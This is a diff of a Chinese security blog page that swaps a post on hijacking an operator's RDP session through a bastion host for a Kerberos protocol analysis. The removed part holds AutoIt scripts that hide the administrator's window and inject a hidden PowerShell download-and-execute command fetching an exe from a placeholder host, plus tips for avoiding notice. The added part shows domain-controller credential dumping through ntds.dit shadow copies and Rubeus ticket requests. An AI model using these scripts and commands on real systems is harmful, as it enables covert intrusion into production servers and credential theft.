@@ -12,7 +12,7 @@
     
     <meta http-equiv="Cache-Control" content="no-siteapp" />
 
-    <title>AutoIt SendKey绕过堡垒机两步验证 | MYZXCG</title>
+    <title>Kerberos 认证过程详细分析（一） | MYZXCG</title>
 
     <link rel="stylesheet" href="/css/meme.min.248ffc922f6c9975e8625f71e7ebc1a9e2180e744b9528665612bf7c124dea69.css"/>
 
@@ -27,7 +27,7 @@
         <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" media="print" onload="this.media='all'" />
         <noscript><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=EB&#43;Garamond:ital,wght@0,400;0,500;0,700;1,400;1,700&amp;family=Noto&#43;Serif&#43;SC:wght@400;500;700&amp;family=Source&#43;Code&#43;Pro:ital,wght@0,400;0,700;1,400;1,700&amp;display=swap" /></noscript>
 
-    <meta name="author" content="myzxcg" /><meta name="description" content="利用环境 阿里云云盾堡垒机后是Windows server的生产环境机器，运维通过rdp……" />
+    <meta name="author" content="myzxcg" /><meta name="description" content="此文于2022年1月28日更新。 利用Wireshark 解密 Kerberos 的加密字段 参考 1 2 3 4 5……" />
 
     <link rel="shortcut icon" href="/favicon.ico" type="image/x-icon" />
     <link rel="mask-icon" href="/icons/safari-pinned-tab.svg" color="" />
@@ -47,22 +47,22 @@
     
 
     
-    <link rel="canonical" href="https://myzxcg.com/2021/01/AutoIt-SendKey%E7%BB%95%E8%BF%87%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%B8%A4%E6%AD%A5%E9%AA%8C%E8%AF%81/" />
+    <link rel="canonical" href="https://myzxcg.com/2021/08/Kerberos-%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E4%B8%80/" />
     
 
 <script type="application/ld+json">
     {
         "@context": "https://schema.org",
         "@type": "BlogPosting",
-        "datePublished": "2021-01-16T17:15:39+08:00",
-        "dateModified": "2021-11-20T12:57:53+08:00",
-        "url": "https://myzxcg.com/2021/01/AutoIt-SendKey%E7%BB%95%E8%BF%87%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%B8%A4%E6%AD%A5%E9%AA%8C%E8%AF%81/",
-        "headline": "AutoIt SendKey绕过堡垒机两步验证",
-        "description": "利用环境 阿里云云盾堡垒机后是Windows server的生产环境机器，运维通过rdp……",
+        "datePublished": "2021-08-26T00:43:06+08:00",
+        "dateModified": "2022-01-28T11:47:14+08:00",
+        "url": "https://myzxcg.com/2021/08/Kerberos-%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E4%B8%80/",
+        "headline": "Kerberos 认证过程详细分析（一）",
+        "description": "此文于2022年1月28日更新。 利用Wireshark 解密 Kerberos 的加密字段 参考 1 2 3 4 5……",
         "inLanguage" : "zh-CN",
         "articleSection": "posts",
-        "wordCount":  1794 ,
-        "image": ["https://myzxcg.com/images/image-20210116213501668.png","https://myzxcg.com/images/image-20210116184509174.png"],
+        "wordCount":  4355 ,
+        "image": ["https://myzxcg.com/images/16433394938312.jpg","https://myzxcg.com/images/16433395567774.jpg","https://myzxcg.com/images/16433395743668.jpg","https://myzxcg.com/images/16433395901605.jpg","https://myzxcg.com/images/16433396082150.jpg","https://myzxcg.com/images/16433397764375.jpg","https://myzxcg.com/images/16433397954929.jpg","https://myzxcg.com/images/16433398108951.jpg","https://myzxcg.com/images/16433398435167.jpg","https://myzxcg.com/images/16433399381159.jpg","https://myzxcg.com/images/16433399553851.jpg","https://myzxcg.com/images/16433399763549.jpg","https://myzxcg.com/images/16433399922282.jpg","https://myzxcg.com/images/16433400445338.jpg","https://myzxcg.com/images/16433400596785.jpg","https://myzxcg.com/images/16433400785655.jpg","https://myzxcg.com/images/16433400953721.jpg","https://myzxcg.com/images/16433401619561.jpg","https://myzxcg.com/images/16433401780867.jpg","https://myzxcg.com/images/16433401928335.jpg","https://myzxcg.com/images/16433402080116.jpg","https://myzxcg.com/images/16433402219694.jpg","https://myzxcg.com/images/16433402674743.jpg","https://myzxcg.com/images/16433402822227.jpg"],
         "author": {
             "@type": "Person",
             "description": "专注于Web安全、内网渗透. 记录学习与渗透过程中遇到的有意思的点, 分享技巧与知识. 欢迎交流～",
@@ -100,14 +100,14 @@
 
 
 
-<meta property="og:title" content="AutoIt SendKey绕过堡垒机两步验证" />
-<meta property="og:description" content="利用环境 阿里云云盾堡垒机后是Windows server的生产环境机器，运维通过rdp……" />
-<meta property="og:url" content="https://myzxcg.com/2021/01/AutoIt-SendKey%E7%BB%95%E8%BF%87%E5%A0%A1%E5%9E%92%E6%9C%BA%E4%B8%A4%E6%AD%A5%E9%AA%8C%E8%AF%81/" />
+<meta property="og:title" content="Kerberos 认证过程详细分析（一）" />
+<meta property="og:description" content="此文于2022年1月28日更新。 利用Wireshark 解密 Kerberos 的加密字段 参考 1 2 3 4 5……" />
+<meta property="og:url" content="https://myzxcg.com/2021/08/Kerberos-%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B%E8%AF%A6%E7%BB%86%E5%88%86%E6%9E%90%E4%B8%80/" />
 <meta property="og:site_name" content="MYZXCG" />
-<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/image-20210116213501668.png" />
+<meta property="og:locale" content="zh" /><meta property="og:image" content="https://myzxcg.com/images/16433394938312.jpg" />
 <meta property="og:type" content="article" />
-    <meta property="article:published_time" content="2021-01-16T17:15:39&#43;08:00" />
-    <meta property="article:modified_time" content="2021-11-20T12:57:53&#43;08:00" />
+    <meta property="article:published_time" content="2021-08-26T00:43:06&#43;08:00" />
+    <meta property="article:modified_time" content="2022-01-28T11:47:14&#43;08:00" />
     
     <meta property="article:section" content="posts" />
 
@@ -211,7 +211,7 @@
 
         <article class="content post h-entry" data-align="justify" data-type="posts" data-toc-num="true">
 
-            <h1 class="post-title p-name">AutoIt SendKey绕过堡垒机两步验证</h1>
+            <h1 class="post-title p-name">Kerberos 认证过程详细分析（一）</h1>
 
             
 
@@ -225,7 +225,7 @@
 <div class="post-meta">
     
         
-        <time datetime="2021-01-16T17:15:39&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.1.16</time>
+        <time datetime="2021-08-26T00:43:06&#43;08:00" class="post-meta-item published dt-published"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512" class="icon post-meta-icon"><path d="M400 64h-48V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H160V12c0-6.627-5.373-12-12-12h-40c-6.627 0-12 5.373-12 12v52H48C21.49 64 0 85.49 0 112v352c0 26.51 21.49 48 48 48h352c26.51 0 48-21.49 48-48V112c0-26.51-21.49-48-48-48zm-6 400H54a6 6 0 0 1-6-6V160h352v298a6 6 0 0 1-6 6zm-52.849-200.65L198.842 404.519c-4.705 4.667-12.303 4.637-16.971-.068l-75.091-75.699c-4.667-4.705-4.637-12.303.068-16.971l22.719-22.536c4.705-4.667 12.303-4.637 16.97.069l44.104 44.461 111.072-110.181c4.705-4.667 12.303-4.637 16.971.068l22.536 22.718c4.667 4.705 4.636 12.303-.069 16.97z"/></svg>&nbsp;2021.8.26</time>
     
     
     
@@ -239,7 +239,7 @@
     
     
         
-        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;4&nbsp;分钟</span>
+        <span class="post-meta-item reading-time"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon post-meta-icon"><path d="M256 8C119 8 8 119 8 256s111 248 248 248 248-111 248-248S393 8 256 8zm0 448c-110.5 0-200-89.5-200-200S145.5 56 256 56s200 89.5 200 200-89.5 200-200 200zm61.8-104.4l-84.9-61.7c-3.1-2.3-4.9-5.9-4.9-9.7V116c0-6.6 5.4-12 12-12h32c6.6 0 12 5.4 12 12v141.7l66.8 48.6c5.4 3.9 6.5 11.4 2.6 16.8L334.6 349c-3.9 5.3-11.4 6.5-16.8 2.6z"/></svg>&nbsp;9&nbsp;分钟</span>
     
 
    
@@ -253,71 +253,33 @@
 
             <nav class="contents">
   <h2 id="contents" class="contents-title">目录</h2><ol class="toc">
-    <li><a id="contents:利用环境" href="#利用环境">利用环境</a></li>
-    <li><a id="contents:sendkey" href="#sendkey">SendKey</a></li>
-    <li><a id="contents:利用思路" href="#利用思路">利用思路</a>
+    <li><a id="contents:简介" href="#简介">简介</a></li>
+    <li><a id="contents:as-请求分析" href="#as-请求分析">AS 请求分析</a>
       <ol>
-        <li><a id="contents:细节处理" href="#细节处理">细节处理</a></li>
-        <li><a id="contents:注意事项" href="#注意事项">注意事项</a></li>
+        <li><a id="contents:as_req" href="#as_req">AS_REQ</a></li>
+        <li><a id="contents:as_rep" href="#as_rep">AS_REP</a></li>
       </ol>
     </li>
-    <li><a id="contents:autoit代码" href="#autoit代码">AutoIt代码</a></li>
+    <li><a id="contents:tgs-请求分析" href="#tgs-请求分析">TGS 请求分析</a>
+      <ol>
+        <li><a id="contents:tgs_req" href="#tgs_req">TGS_REQ</a></li>
+        <li><a id="contents:tgs_rep" href="#tgs_rep">TGS_REP</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:server-请求分析" href="#server-请求分析">Server 请求分析</a>
+      <ol>
+        <li><a id="contents:ap_req" href="#ap_req">AP_REQ</a></li>
+        <li><a id="contents:ap_rep" href="#ap_rep">AP_REP</a></li>
+      </ol>
+    </li>
+    <li><a id="contents:pac" href="#pac">PAC</a></li>
+    <li><a id="contents:参考" href="#参考">参考</a></li>
   </ol>
 </nav><div class="post-body e-content">
-                <h2 id="利用环境"><a href="#利用环境" class="anchor-link">#</a><a href="#contents:利用环境" class="headings">利用环境</a></h2>
-<p>阿里云云盾堡垒机后是Windows server的生产环境机器，运维通过rdp到云盾堡垒机，再去选择服务器连接。虽然有了堡垒机的账号密码，但登录云盾堡垒机需要两步验证码，又没办法获取到运维的MFA，所以无法直接登录。在这种情况下，可通过SendKey的方式，来获取线上服务器权限。</p>
-<p><a href="https://help.aliyun.com/document_detail/143796.html?spm=a2c4g.11186623.6.630.16a75d77mxpd7B" target="_blank" rel="noopener">RDP协议运维 - 堡垒机 - 阿里云</a></p>
-<p>运维登录过程：从本机RDP到跳板机（windows server 2012 R2） ==&gt; 通过跳板机再RDP到阿里云堡垒机（输入堡垒机账号和两步验证码）==&gt; 堡垒机再走rdp协议连接到线上服务器。</p>
-<p>其中跳板机可控，目标有一个普通用户专门用来连接堡垒机。</p>
-<h2 id="sendkey"><a href="#sendkey" class="anchor-link">#</a><a href="#contents:sendkey" class="headings">SendKey</a></h2>
-<p>SendKey其实就是发送键盘指令。Windows下可以通过向某个窗口发送键盘指令来执行命令。</p>
-<p>例如发送WIN+R打开运行窗口，再发送cmd就会弹出命令行窗口。这个过程就像你自己在键盘上按WIN+R，打开cmd的方式一样。</p>
-<p><img src="/images/image-20210116213501668.png" alt=""></p>
-<p>mstsc程序的键盘设置必须是在远程计算机上。这样发送组合键才会发送到RDP的窗口去。</p>
-<p><img src="/images/image-20210116184509174.png" alt=""></p>
-<p>推荐使用<a href="https://www.autoitscript.com/site/" target="_blank" rel="noopener">AutoIt</a>来编写SendKey的程序。除此之外还有powershell版的<a href="https://archive.codeplex.com/?p=wasp" target="_blank" rel="noopener">WASP</a>来SendKey，但是WASP不如AutoIt的可定制化程度高。</p>
-<p><strong>整体的思路是：</strong> 当运维登录堡垒机时(已经连上了线上服务器，即开启了RDP窗口)，在跳板机执行AutoIt编写的exe，就会向堡垒机的RDP窗口发送键盘指令。比如发送WIN+R之后紧接着发送</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">POWERSHELL</span> <span class="n">-WINDOWSTYLE</span> <span class="n">HIDDEN</span> <span class="n">-C</span> <span class="s2">&#34;CERTUTIL -URLCACHE -SPLIT -F HTTPS://xxx.com/xxx.exe C:/WINDOWS/TASKS/xxx.exe;C:/WINDOWS/TASKS/xxx.exe&#34;</span>
-</code></pre></td></tr></table></div>
-</div>
-</div><p>来下载exe并执行。过程很简单，但是有很多细节和坑点需要注意，下面细说一下，代码在最后。</p>
-<h2 id="利用思路"><a href="#利用思路" class="anchor-link">#</a><a href="#contents:利用思路" class="headings">利用思路</a></h2>
-<p>当运维登录堡垒机时(已经连上了线上服务器，即开启了RDP窗口)，在跳板机执行AutoIt编写的exe，就会向堡垒机的RDP窗口发送键盘指令。</p>
-<p>比如发送WIN+R之后，紧接着发送</p>
-<div class="highlight"><div class="chroma">
-<div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt">1
-</span></code></pre></td>
-<td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="n">POWERSHELL</span> <span class="n">-WINDOWSTYLE</span> <span class="n">HIDDEN</span> <span class="n">-C</span> <span class="s2">&#34;CERTUTIL -URLCACHE -SPLIT -F &lt;HTTPS://xxx.com/xxx.exe&gt; C:/WINDOWS/TASKS/xxx.exe;C:/WINDOWS/TASKS/xxx.exe&#34;</span>
-</code></pre></td></tr></table></div>
-</div>
-</div><p>即可下载exe并执行。过程很简单，但是有很多细节和坑点需要注意，下面主要细说一下，代码在最后。</p>
-<h3 id="细节处理"><a href="#细节处理" class="anchor-link">#</a><a href="#contents:细节处理" class="headings">细节处理</a></h3>
-<p>在发送指令的过程中不能被干扰，如果在SendKey的时候，RDP窗口内的聚焦不在WIN+R打开的运行窗口或cmd.exe的窗口内，那么就会输入到其他地方。并且还有最重要的一点要处理：总不能当着管理员的面WIN+R弹个框，输入一堆命令执行吧–_–</p>
-<p><strong>解决办法</strong></p>
-<ol>
-<li>可以在发送指令的时候先隐藏这个RDP窗口(不是最小化，是直接隐藏这个窗口)，AutoIt可以实现。这样管理员无法操控和看到这个窗口，如果你有跳板机的管理员权限，甚至可以禁用键盘输入。这样更不容易影响SendKey的过程。整个过程执行完，运维看到窗口消失的时间大概3-4秒。</li>
-<li>在SendKey的过程中，可以在跳板机上添加一条防火墙，阻断目标对跳板机的连接，也就3-4秒时间，之后再给他恢复就好了。</li>
-</ol>
-<p>在有跳板机管理员权限的情况下，推荐第二种。这样可能以为是网络波动暂时断了而已，第一种方法窗口突然消失，次数多了，管理员会去排查问题。</p>
-<h3 id="注意事项"><a href="#注意事项" class="anchor-link">#</a><a href="#contents:注意事项" class="headings">注意事项</a></h3>
-<ol>
-<li>
-<p>SendKey的方式，并不是百分百成功率。</p>
-<p>某种极端情况：假如把运维的连接的rdp窗口隐藏后，运维疯狂按键盘，这种是百分百失败（WIN+R那里输入的字符串会乱，但疯狂点鼠标不会有影响）。所以最好拿到跳板机的管理员权限，这样可以通过禁用键盘输入来提高成功率。保险起见还可以加上防火墙规则，使跳板机与服务器之间的状态变为正在连接，这时再来执行。</p>
-</li>
-<li>
-<p>阿里云堡垒机默认有录屏功能，如果目标去查看录像，就很容易被发现。</p>
-</li>
-</ol>
-<h2 id="autoit代码"><a href="#autoit代码" class="anchor-link">#</a><a href="#contents:autoit代码" class="headings">AutoIt代码</a></h2>
-<p><strong>第一版</strong></p>
+                <p><strong>此文于2022年1月28日更新。</strong></p>
+<blockquote>
+<p>利用<strong>Wireshark 解密 Kerberos 的加密字段   <a href="https://mp.weixin.qq.com/s/eTiQRoEh1DvNGEuPErYsAw" target="_blank" rel="noopener">参考</a></strong></p>
+</blockquote>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
 <pre tabindex="0" class="chroma"><code><span class="lnt"> 1
@@ -332,104 +294,406 @@
 </span><span class="lnt">10
 </span><span class="lnt">11
 </span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
-</span><span class="lnt">23
-</span><span class="lnt">24
-</span><span class="lnt">25
-</span><span class="lnt">26
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#include &lt;AutoItConstants.au3&gt;</span>
-<span class="n">Local</span> <span class="nv">$aList</span> <span class="p">=</span> <span class="n">WinList</span><span class="p">(</span><span class="s2">&#34;192.168.1.1:3389 - 远程桌面连接&#34;</span><span class="p">)</span>
-<span class="k">For</span> <span class="nv">$i</span> <span class="p">=</span> <span class="n">1</span> <span class="n">To</span> <span class="nv">$aList</span><span class="p">[</span><span class="n">0</span><span class="p">][</span><span class="n">0</span><span class="p">]</span>
-   <span class="n">Example</span><span class="p">(</span><span class="nv">$aList</span><span class="p">[</span><span class="nv">$i</span><span class="p">][</span><span class="n">1</span><span class="p">]))</span>
-   <span class="n">sleep</span><span class="p">(</span><span class="n">8000</span><span class="p">)</span>
-<span class="n">Next</span>
-<span class="n">Func</span> <span class="n">Example</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">)</span>
-  <span class="n">Local</span> <span class="nv">$iState</span> <span class="p">=</span> <span class="n">WinGetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">);</span><span class="n">判断是否是最小化</span>
-  <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_HIDE</span><span class="p">)</span>
-  <span class="n">SendKeepActive</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">)</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;#r&#34;</span><span class="p">)</span>
-  <span class="n">sleep</span><span class="p">(</span><span class="n">800</span><span class="p">)</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{DEL 2}&#34;</span><span class="p">)</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{SHIFTDOWN}&#34;</span><span class="p">);</span><span class="n">全部大写</span><span class="err">，</span><span class="n">是为了解决输入法的问题</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{SHIFTUP}&#34;</span><span class="p">)</span>
-  <span class="n">sleep</span><span class="p">(</span><span class="n">800</span><span class="p">)</span>
-  <span class="n">Opt</span><span class="p">(</span><span class="s2">&#34;SendKeyDelay&#34;</span><span class="p">,</span> <span class="n">0</span><span class="p">)</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s1">&#39;POWERSHELL{SPACE}{SPACE}-WINDOWSTYLE{SPACE}{SPACE}HIDDEN{SPACE}{SPACE}-C{SPACE}{SPACE}&#34;CERTUTIL{SPACE}{SPACE}-URLCACHE{SPACE}{SPACE}-SPLIT{SPACE}{SPACE}-F{SPACE}{SPACE}HTTPS://XXX.com/XXX.PNG{SPACE}{SPACE}C:/WINDOWS/TASKS/XXX.EXE;C:/WINDOWS/TASKS/XXX.EXE&#34;&#39;</span><span class="p">)</span>
-  <span class="n">Sleep</span><span class="p">(</span><span class="n">500</span><span class="p">)</span>
-  <span class="n">Send</span><span class="p">(</span><span class="s2">&#34;{enter}{enter}&#34;</span><span class="p">)</span>
-  <span class="n">sleep</span><span class="p">(</span><span class="n">500</span><span class="p">)</span>
-  <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_SHOW</span><span class="p">)</span>
-  <span class="k">If</span> <span class="n">BitAND</span><span class="p">(</span><span class="nv">$iState</span><span class="p">,</span> <span class="nv">$WIN_STATE_MINIMIZED</span><span class="p">)</span> <span class="n">Then</span>
-     <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_MINIMIZE</span><span class="p">)</span>
-  <span class="n">EndIf</span>
-<span class="n">EndFunc</span>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="c1">#域控导出ntds.dit和system.hive</span>
+vssadmin create shadow /for<span class="o">=</span>C:
+copy <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1<span class="se">\W</span>indows<span class="se">\N</span>TDS<span class="se">\N</span>TDS.dit C:<span class="se">\n</span>tds.dit
+copy <span class="se">\\</span>?<span class="se">\G</span>LOBALROOT<span class="se">\D</span>evice<span class="se">\H</span>arddiskVolumeShadowCopy1<span class="se">\W</span>indows<span class="se">\S</span>ystem32<span class="se">\c</span>onfig<span class="se">\S</span>YSTEM C:<span class="se">\s</span>ystem.hive
+vssadmin delete shadows /all
+git clone https://github.com/csababarta/ntdsxtract.git
+<span class="nb">cd</span> ntdsxtract/ <span class="o">&amp;&amp;</span> python -m pip install pycryptodome
+<span class="c1">#kali esedbexport ,ntds.dit和system.hive 同目录</span>
+esedbexport ntds.dit
+python dskeytab.py ntds.dit.export/datatable.4 ntds.dit.export/link_table.6 system.hive ./ 1.keytab
+<span class="c1">#获取到1.keytab后，把该文件导入到Wireshark的KRB5协议下，并勾选&#34;Try to decrypt Kerberos blobs&#34;</span>
+<span class="c1">#加载完keytab文件后，wireshark会自动对当前的数据包进行解密尝试，如果解密成功，就会是显示蓝色，不成功就是黄色。</span>
 </code></pre></td></tr></table></div>
 </div>
-</div><p><strong>第二版</strong></p>
-<p>上面的代码利用的Sendkey单个字符串的逐步发送（就像敲键盘一样），有一定的输入时间，并且输入过程容易受到干扰导致字符串出错。</p>
-<p>经过一阵摸索后，发现可以利用剪贴板，来直接进行粘贴复制，速度相比以前快了很多，还不用关心目标系统上输入法的问题（如果隐藏窗口的话，窗口消失就1s）。</p>
+</div><h2 id="简介"><a href="#简介" class="anchor-link">#</a><a href="#contents:简介" class="headings">简介</a></h2>
+<p>Kerberos 是由麻省理工学院提出的一种网络身份验证协议。它旨在通过使用密钥加密技术为客户端/服务器应用程序提供强身份验证。Kerberos 协议有两个基础认证模块：<code>AS_REQ &amp; AS_REP</code> 和 <code>TGS_REQ &amp; TGS_REP</code> 。微软扩展了两个认证模块S4U 和 PAC 。</p>
+<p>本文着重分析<code>AS_REQ &amp; AS_REP</code> 、 <code>TGS_REQ &amp; TGS_REP</code> 和 <code>AP_REQ &amp; AP_REP</code> 三个过程的数据包，以此来了解Kerberos 的通信与认证过程。</p>
+<p>下面以administrator 用户访问域控<code>OWA2013.rootkit.org</code>的CIFS 服务为例。抓包分析该过程。 <strong><a href="https://github.com/GhostPack/Rubeus" target="_blank" rel="noopener">Rubeus</a></strong></p>
 <div class="highlight"><div class="chroma">
 <div class="table-container"><table class="lntable"><tr><td class="lntd">
-<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
-</span><span class="lnt"> 2
-</span><span class="lnt"> 3
-</span><span class="lnt"> 4
-</span><span class="lnt"> 5
-</span><span class="lnt"> 6
-</span><span class="lnt"> 7
-</span><span class="lnt"> 8
-</span><span class="lnt"> 9
-</span><span class="lnt">10
-</span><span class="lnt">11
-</span><span class="lnt">12
-</span><span class="lnt">13
-</span><span class="lnt">14
-</span><span class="lnt">15
-</span><span class="lnt">16
-</span><span class="lnt">17
-</span><span class="lnt">18
-</span><span class="lnt">19
-</span><span class="lnt">20
-</span><span class="lnt">21
-</span><span class="lnt">22
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#include &lt;AutoItConstants.au3&gt;</span>
-<span class="n">ClipPut</span><span class="p">(</span><span class="s2">&#34;POWERSHELL -W HIDDEN -C IWR HTTPS://xxx.COM/xx.CAB -OUTF $ENV:TMP/xx.CAB;EXPAND $ENV:TMP/xx.CAB -F:* $ENV:TMP;&amp;$ENV:TMP/xx.exe&#34;</span><span class="p">)</span>
-<span class="n">Local</span> <span class="nv">$hWnd</span><span class="p">=</span><span class="n">HWnd</span><span class="p">(</span><span class="nv">$CmdLine</span><span class="p">[</span><span class="n">1</span><span class="p">])</span> <span class="p">;</span><span class="n">handle</span>
-<span class="n">ControlFocus</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
-<span class="n">Local</span> <span class="nv">$iState</span> <span class="p">=</span> <span class="n">WinGetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">);</span><span class="n">判断是否是最小化</span>
-<span class="k">If</span> <span class="n">BitAND</span><span class="p">(</span><span class="nv">$iState</span><span class="p">,</span> <span class="nv">$WIN_STATE_MINIMIZED</span><span class="p">)</span> <span class="n">Then</span>
-   <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_RESTORE</span><span class="p">)</span>
-<span class="k">Else</span>
-   <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_HIDE</span><span class="p">)</span>
-<span class="n">EndIf</span>
-<span class="n">ControlSend</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;#r&#34;</span><span class="p">)</span>
-<span class="n">ControlSend</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;+{INS}&#34;</span><span class="p">)</span>
-<span class="p">;</span><span class="n">Sleep</span><span class="p">(</span><span class="n">3000</span><span class="p">)</span>
-<span class="n">ControlSend</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;{enter}&#34;</span><span class="p">)</span>
-<span class="n">Sleep</span><span class="p">(</span><span class="n">300</span><span class="p">)</span>
-<span class="k">If</span> <span class="n">BitAND</span><span class="p">(</span><span class="nv">$iState</span><span class="p">,</span> <span class="nv">$WIN_STATE_MINIMIZED</span><span class="p">)</span> <span class="n">Then</span>
-   <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_MINIMIZE</span><span class="p">)</span>
-<span class="k">Else</span>
-   <span class="n">WinSetState</span><span class="p">(</span><span class="nv">$hWnd</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="nv">@SW_SHOW</span><span class="p">)</span>
-<span class="n">EndIf</span>
-<span class="n">ControlFocus</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">,</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
-<span class="n">ClipPut</span><span class="p">(</span><span class="s2">&#34;&#34;</span><span class="p">)</span>
+<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c">#请求TGT</span>
+<span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">asktgt</span> <span class="p">/</span><span class="n">user</span><span class="err">:</span><span class="s2">&#34;administrator&#34;</span> <span class="p">/</span><span class="n">password</span><span class="err">:</span><span class="s2">&#34;admin!@#45&#34;</span> <span class="p">/</span><span class="n">domain</span><span class="err">:</span><span class="n">rootkit</span><span class="p">.</span><span class="n">org</span> <span class="p">/</span><span class="n">dc</span><span class="err">:</span><span class="s2">&#34;OWA2013.rootkit.org&#34;</span> <span class="p">/</span><span class="n">nowrap</span>
+<span class="c">#请求ST</span>
